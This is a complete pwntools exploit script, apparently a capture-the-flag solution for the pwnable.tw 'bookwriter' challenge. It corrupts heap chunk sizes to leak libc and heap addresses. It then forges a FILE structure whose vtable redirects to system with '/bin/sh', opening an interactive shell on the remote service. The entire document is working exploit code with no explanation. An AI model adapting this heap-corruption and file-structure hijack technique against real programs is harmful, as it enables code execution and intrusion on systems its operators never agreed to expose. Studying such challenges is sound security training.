#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('bookwriter_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*malloc

        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10304
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10304)
else:
    p = process([exe.path])

sa(b'Author :', b'a'*0x40)

def in4():
    ru(b'Your choice :')
    s(b'4'.ljust(16,b'\0'))
    # sleep(1)


def add(size, content):
    ru(b'Your choice :')
    s(b'1'.ljust(16,b'\0'))

    s(f'{size}'.encode().ljust(16,b'\0'))
    s(content)
    # sleep(1)


def edit(idx, content):
    ru(b'Your choice :')
    s(b'3'.ljust(16,b'\0'))
    s(f'{idx}'.encode().ljust(16,b'\0'))
    s(content)
    # sleep(1)


def show(idx):
    ru(b'Your choice :')
    s(b'2'.ljust(16,b'\0'))

    s(f'{idx}'.encode().ljust(16,b'\0'))
    # sleep(1)



add(0x1058, b'a'*0x1058)
# GDB()


edit(0,b'b'*0x1058)

edit(0,b'b'*0x1058 + p16(0xfa1) + p8(0))

add(0x1008, b'wdwdnadhihihihiwhdwioaqhd091dhuhu')

add(0x18, b'w'*8)
# input()
show(2)

ru(b'w'*8)
libc_leak = u64(r(6) + b'\0\0')
libc.address = libc_leak-0x3c4188
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')
input()
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')
edit(2, b'2'*0x18)

edit(2, b'2'*0x18 + p16(0xfff1))
GDB()
input()
# packets are too large
for i in range(3, 5):
    add(0xefe8, f'{i}'.encode()*0xefe8)
    edit(i, f'{i}'.encode()*0xefe8)
    edit(i, f'{i}'.encode()*0xefe8 + p16(0xfff1))

# 5
in4()
ru(b'a'*0x40)
# server
heap_leak = u32(r(4))
# local
# heap_leak = u32(r(3) + b'\0')
heap_base = heap_leak -0x10
info(f'heap leak: {hex(heap_leak)}')
info(f'heap base: {hex(heap_base)}')
sla(b'(yes:1 / no:0) ', b'1')

load = flat(
    b'a'*0x20,
    0,
    0x210,
    0,
    0x602090
)

sa(b'Author :', load)


add(0x1fa0, b'wiehwudhwihdwdw')
# GDB()
load = flat(
    b'1'*0x18,
    0x000000000000d031,
    libc.address+0x3c3b78,
    0x602080,
)
edit(1, load)
# target : 0x625010

def fsop():
    load = flat(
        b'a'*0x10,
        libc.sym._IO_2_1_stdout_,
        # libc.sym.environ,
        0x6020a0, 0x6020a8, 
        libc.sym.system
    )

    add(0x200, load)
    GDB()
    io = FileStructure()

    io.flags = 0x3b01010101010201
    io._IO_read_ptr = b'/bin/sh\0'
    io._lock = 0x602280

    io.vtable = 0x602080

    edit(0, bytes(io))

def rop_chain():
    load = flat(
        b'a'*0x10,
        libc.sym._IO_2_1_stdout_,
        # libc.sym.environ,
        0x6020a0, 0x6020a8, 
        libc.sym.system
    )

    add(0x200, load)
    GDB()
    
# rop_chain()
fsop()
p.interactive()

